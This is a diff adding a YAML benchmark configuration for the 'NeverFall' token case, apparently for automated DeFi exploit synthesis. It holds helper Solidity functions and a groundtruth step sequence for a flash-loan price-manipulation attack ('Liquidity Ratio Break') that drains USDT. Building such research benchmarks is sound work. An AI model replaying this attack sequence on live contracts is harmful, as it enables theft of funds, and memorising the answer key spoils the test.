@@ -1,0 +1,77 @@
+# Information for benchmarks building.
+project_name: "NeverFall"
+
+ctrt_name2cls:
+  - ["usdt", "USDT"]
+  - ["neverFall", "NeverFall"]
+  - ["pair", "UniswapV2Pair"]
+  - ["factory", "UniswapV2Factory"]
+  - ["router", "UniswapV2Router"]
+
+ctrt_name2deploy:
+  - ["usdt", ""]
+  - ["neverFall", "new NeverFall (address(usdt))"]
+  - ["pair", ""]
+  - ["factory", ""]
+  - ["router", ""]
+  
+extra_actions:
+  - "function swap_neverFall_attacker_usdt_neverFall(uint256 amount, uint256 amountOut) internal eurus {
+    IERC20(usdt).approve(address(neverFall), type(uint256).max);
+    NeverFall(neverFall).buy(amount);
+    }"
+
+  - "function swap_neverFall_attacker_neverFall_usdt(uint256 amount, uint256 amountOut) internal eurus {
+    IERC20(usdt).approve(address(neverFall), type(uint256).max);
+    NeverFall(neverFall).sell(amount);
+    }"
+
+  - "function burn_neverFall_pair(uint256 amount) internal eurus {
+      usdt.transfer(address(pair), amount);
+      pair.swap(0, pair.getAmountOut(amount, address(usdt)) , owner, new bytes(0));
+    }"
+
+
+extra_deployments_before:
+- "pair.special_mint(balanceOfpairneverFall);"
+
+extra_deployments:
+- "neverFall.afterDeploy(address(router), address(pair)); 
+  neverFall.setStartBuy();
+  neverFall.transfer(address(neverFall), 99537303621642211235625620728);
+  "
+
+extra_statements: []
+
+attack_goal_str: "usdt"
+
+groundtruth:
+  - ["borrow", "usdt", "owner", "1600000e18"]
+  - ["swap", "neverFall", "attacker", "usdt", "neverFall", "200000 * 1e18", "1"]
+  - ["burn", "neverFall", "pair", "1300000 * 1e18"]
+  - ["swap", "neverFall", "attacker", "neverFall", "usdt", "neverFall.balanceOf(attacker)", "1"]
+  - ["payback", "usdt", "owner", "1600000e18"]
+
+# Information for search space building.
+roles:
+  "usdt":
+    is_asset: true
+    is_erc20: true
+    is_stablecoin: true
+  "neverFall":
+    is_asset: true
+    is_erc20: true
+    is_stablecoin: true
+  "pair":
+    is_asset: true
+    is_swappair: true
+    is_uniswap: true
+    is_erc20: true
+    token_pair: ["usdt", "neverFall"]
+    support_swaps:
+      "usdt": ["usdt", "neverFall"]
+      "neverFall": ["usdt", "neverFall"]
+    is_oracle: true
+    oracle: "pair"
+
+pattern: "Liquidity Ratio Break"
